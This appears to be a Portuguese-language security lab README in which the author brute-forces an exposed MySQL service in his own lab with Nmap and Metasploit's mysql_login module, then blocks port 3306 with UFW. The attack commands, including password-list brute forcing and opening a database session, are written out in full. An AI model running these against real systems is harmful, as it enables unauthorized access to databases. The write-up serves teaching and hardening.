Laboratório de Segurança - Brute Force com Metasploit em MySQL e Mitigação com UFW
Descrição

Este projeto demonstra, em ambiente controlado, uma simulação de ataque de força bruta em um serviço MySQL exposto, seguido da aplicação de medidas de mitigação para aumento da segurança.

O objetivo é evidenciar, na prática, como vulnerabilidades podem ser exploradas, permitindo acesso indevido ao sistema, e posteriormente corrigidas através de técnicas de hardening.

Ambiente do Laboratório
Máquina atacante: Kali Linux (Hyper-V)
Máquina alvo: Ubuntu Server (Hyper-V)
Ferramentas utilizadas
Nmap
Metasploit Framework
MySQL Server
UFW (Uncomplicated Firewall)
Configuração do Cenário
Estado inicial (vulnerável)
Serviço MySQL ativo na porta 3306
Acesso externo permitido
Usuário e senha configurados no banco
Sem restrições de firewall
Teste de Vulnerabilidade
1. Enumeração com Nmap

Identificação do serviço MySQL exposto:

nmap -p 3306 <IP_DO_ALVO>

Resultado:

Porta 3306 aberta
2. Ataque de força bruta com Metasploit
use auxiliary/scanner/mysql/mysql_login
set RHOSTS <IP_DO_ALVO>
set PASS_FILE rockyou.txt
set CreateSession true
run

Resultado:

Múltiplas tentativas de login realizadas
Credenciais válidas encontradas com sucesso
3. Acesso ao banco via sessão

Após a descoberta das credenciais, foi possível estabelecer uma sessão ativa com o MySQL diretamente pelo Metasploit:

sessions -i

Resultado:

Sessão MySQL aberta com sucesso
Acesso autenticado ao banco de dados
4. Acesso direto ao MySQL (opcional)

Também é possível realizar conexão manual utilizando as credenciais descobertas:

mysql -u usuario -p -h <IP_DO_ALVO>
Mitigação
Bloqueio da porta com UFW
sudo ufw deny 3306/tcp

Resultado:

Porta 3306 bloqueada
Conexões externas negadas
Resultado Final
Situação	Resultado
Antes	Acesso não autorizado possível
Depois	Acesso bloqueado com sucesso
Evidências (Pasta images)
Scan do Nmap mostrando porta 3306 aberta
Execução do Metasploit (brute force)
Credenciais encontradas
Sessão aberta (MySQL session opened)
Interação com sessions
Regra do UFW aplicada
Tentativa de conexão falhando após bloqueio
Aviso Legal

Este projeto foi realizado em ambiente controlado, com fins exclusivamente educacionais.
Nenhuma atividade foi executada em sistemas de terceiros ou sem autorização.

Aprendizados
Identificação de serviços expostos
Exploração de autenticação fraca
Uso do Metasploit para testes de segurança
Estabelecimento de sessão ativa com serviço comprometido
Aplicação de hardening básico com firewall (UFW)
Importância da restrição de acesso a serviços sensíveis
Autor

Wladimir Eduardo
Entusiasta de Cibersegurança

Próximos passos
Implementar Fail2Ban para proteção contra brute force
Restringir acesso ao MySQL por IP
Utilizar autenticação mais forte (senhas complexas)
Monitorar logs de acesso
Aplicar regras mais avançadas de firewall